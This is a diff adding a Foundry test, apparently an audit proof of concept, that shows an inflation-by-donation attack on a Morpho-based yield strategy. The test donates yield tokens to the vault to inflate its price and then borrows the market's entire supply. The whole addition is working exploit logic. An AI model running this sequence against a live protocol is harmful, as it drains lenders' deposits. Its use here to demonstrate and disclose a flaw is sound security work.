@@ -568,4 +568,61 @@ abstract contract TestStakingStrategy is TestMorphoYieldStrategy {
         vm.stopPrank();
     }
 
+    function test_Drain_MorphoSuppliers_ByInflationDonation() public {  
+        console.log("Asset is", IERC20Metadata(address(asset)).symbol());  
+  
+        address tapir = address(69);  
+        deal(address(asset), tapir, defaultDeposit);   
+        _enterPosition(tapir, defaultDeposit, 0);  
+        uint256 balanceBefore = lendingRouter.balanceOfCollateral(tapir, address(y));  
+  
+        console.log("Effective supply before initiate withdraw: ", y.effectiveSupply());  
+        console.log("Price before initiate withdraw: ", y.price());  
+  
+        MarketParams memory marketParams = MorphoLendingRouter(address(lendingRouter)).marketParams(address(y));  
+        Position memory position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);  
+        uint maxBorrow = position.collateral * y.price() / 1e36;  
+        console.log("Max borrow is: ", maxBorrow);  
+  
+        vm.startPrank(tapir);  
+        lendingRouter.initiateWithdraw(tapir, address(y), getWithdrawRequestData(tapir, balanceBefore));  
+  
+        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);  
+        maxBorrow = position.collateral * y.price() / 1e36;  
+        console.log("Max borrow after initiate withdraw: ", maxBorrow);  
+  
+        console.log("Effective supply after initiate withdraw: ", y.effectiveSupply());  
+        console.log("Price after initiate withdraw: ", y.price());  
+  
+        deal(address(y.yieldToken()), tapir, 1e18);  
+        console.log("Yield token of the vault: ", IERC20Metadata(address(y.yieldToken())).symbol());  
+        IERC20(y.yieldToken()).transfer(address(y), 1e18);  
+  
+        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);  
+        maxBorrow = position.collateral * y.price() / 1e36;  
+        console.log("Max borrow after donation: ", maxBorrow);  
+  
+        console.log("Effective supply after donation: ", y.effectiveSupply());  
+        console.log("Price after donation: ", y.price());  
+  
+        Id idx = Id.wrap(keccak256(abi.encode(marketParams)));  
+        Market memory market = MORPHO.market(idx);  
+        console.log("Total supplied", market.totalSupplyAssets);  
+        console.log("Total borrowed", market.totalBorrowAssets);  
+  
+        uint256 borrowable = market.totalSupplyAssets - market.totalBorrowAssets;  
+        console.log("Borrowable is", borrowable);  
+  
+        MORPHO.borrow(marketParams, borrowable, 0, tapir, tapir);  
+        console.log("Effective supply after borrow: ", y.effectiveSupply());  
+  
+        position = MORPHO.position(idx, tapir);  
+        console.log("collateral", position.collateral);  
+        console.log("borrowShares", position.borrowShares);  
+  
+        maxBorrow = position.collateral * y.price() / 1e36;  
+        uint canBorrow = maxBorrow - position.borrowShares;  
+        console.log("Can borrow is", canBorrow); // STILL EXTREMELY HIGH!   
+    }  
+
 }
